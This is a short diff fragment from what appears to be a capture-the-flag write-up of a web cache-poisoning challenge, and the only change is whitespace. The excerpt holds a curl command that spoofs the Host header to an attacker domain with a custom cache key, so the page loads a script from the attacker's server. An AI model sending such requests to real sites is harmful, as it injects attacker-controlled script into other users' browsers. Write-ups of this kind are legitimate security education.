@@ -13,7 +13,7 @@ def make_key():
 
 Exploiting these vulnerabilities involves sending a curl request to change the host from which the script is loaded and utilizing a custom cache key for cache poisoning. Here's the curl request
 
-`$ curl "http://challenge.midnightflag.fr:10110/?cachekey=worty" -H "Host: attacker.fr"`
+` $ curl "http://challenge.midnightflag.fr:10110/?cachekey=worty" -H "Host: attacker.fr" `
 
 Additionally, on the server, a script needs to be hosted at /script/main.js with the following content
 
